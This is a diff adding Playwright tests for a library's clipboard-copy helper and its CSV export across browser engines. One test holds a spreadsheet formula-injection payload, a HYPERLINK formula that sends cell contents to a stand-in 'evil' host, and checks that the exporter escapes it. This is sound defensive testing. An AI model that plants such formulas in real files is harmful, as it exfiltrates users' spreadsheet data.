@@ -1585,3 +1585,109 @@ test.describe('/bootstrap — bsTable row selection (roadmap 19.3, F94-F95)', ()
     await expect(row).toHaveClass(/table-active/);
   });
 });
+
+test.describe('/dom — the clipboard write (roadmap 19.4, F97)', () => {
+  // The one thing jsdom cannot supply: a real `navigator.clipboard`, a real secure
+  // context, and a real permission decision. What is asserted here is the contract
+  // F97 actually makes — **no path is silent** — plus the success path wherever the
+  // engine lets Playwright grant the permission.
+  //
+  // Engines differ on clipboard permissions and that is not something to paper
+  // over: Chromium honours `grantPermissions`, the others may refuse regardless.
+  // So the assertion branches on the OUTCOME rather than on the engine name, and
+  // both branches are real: a resolve must have written the text, and a rejection
+  // must be a typed EGL_CLIPBOARD with a reason.
+  test('either writes the text, or fails typed — never silently', async ({
+    page,
+    context,
+    browserName,
+  }) => {
+    if (browserName === 'chromium') {
+      await context.grantPermissions(['clipboard-read', 'clipboard-write']);
+    }
+
+    const outcome = await page.evaluate(async () => {
+      const { copyToClipboard } = window.egl.dom;
+      const { tableCsv } = window.egl.table;
+      const text = tableCsv(
+        [
+          { id: 7, name: 'ada' },
+          { id: 9, name: 'bob' },
+        ],
+        { columns: [{ key: 'id' }, { key: 'name' }], delimiter: '\t' },
+      );
+      try {
+        await copyToClipboard(text);
+        return { ok: true, wrote: text };
+      } catch (error) {
+        return { ok: false, code: error.code, reason: error.reason, name: error.name };
+      }
+    });
+
+    if (outcome.ok) {
+      // What is engine-independent: the text handed to the platform is exactly
+      // what the grammar describes.
+      expect(outcome.wrote).toBe('id\tname\r\n7\tada\r\n9\tbob\r\n');
+
+      // Reading back is the stronger check and is not always available. WebKit
+      // resolves `writeText` — writing is treated as safe — while refusing
+      // `readText` without a user gesture, so a denied read here is the READER
+      // being gated, not our write having failed. Asserted where the platform
+      // allows it, and reported rather than silently skipped where it does not.
+      const readBack = await page.evaluate(async () => {
+        try {
+          return { readable: true, text: await navigator.clipboard.readText() };
+        } catch (error) {
+          return { readable: false, name: error?.name };
+        }
+      });
+      if (readBack.readable) expect(readBack.text).toBe(outcome.wrote);
+      else expect(readBack.name).toBe('NotAllowedError');
+    } else {
+      expect(outcome.code).toBe('EGL_CLIPBOARD');
+      expect(outcome.name).toBe('ClipboardError');
+      expect(['unsupported', 'insecure', 'denied', 'failed']).toContain(outcome.reason);
+    }
+  });
+
+  test('reports an insecure context as such, on a window that says so', async ({ page }) => {
+    // The branch a localhost fixture can never reach on its own: localhost IS a
+    // secure context, so the only honest way to exercise the HTTP case in a real
+    // engine is to hand the helper a window that reports it — which is exactly
+    // what the injectable `window` option is for.
+    const result = await page.evaluate(async () => {
+      const { copyToClipboard } = window.egl.dom;
+      try {
+        await copyToClipboard('x', { window: { navigator: {}, isSecureContext: false } });
+        return { ok: true };
+      } catch (error) {
+        return { ok: false, code: error.code, reason: error.reason, message: error.message };
+      }
+    });
+
+    expect(result.ok).toBe(false);
+    expect(result.code).toBe('EGL_CLIPBOARD');
+    expect(result.reason).toBe('insecure');
+    expect(result.message).toMatch(/HTTPS/);
+  });
+
+  test('the CSV a real engine produces is the CSV the grammar describes', async ({ page }) => {
+    // tableCsv is pure and covered in Node; what this adds is that the built
+    // bundle, in three engines, escapes the same way — the file a user downloads
+    // is the file the tests describe.
+    const csv = await page.evaluate(() => {
+      const { tableCsv } = window.egl.table;
+      return tableCsv(
+        [
+          { note: '=HYPERLINK("http://evil/?"&A1,"x")', n: -5 },
+          { note: 'has,comma', n: 1 },
+        ],
+        { columns: [{ key: 'note', header: 'Note' }, { key: 'n' }] },
+      );
+    });
+
+    expect(csv).toBe(
+      'Note,n\r\n' + '"\'=HYPERLINK(""http://evil/?""&A1,""x"")",-5\r\n' + '"has,comma",1\r\n',
+    );
+  });
+});
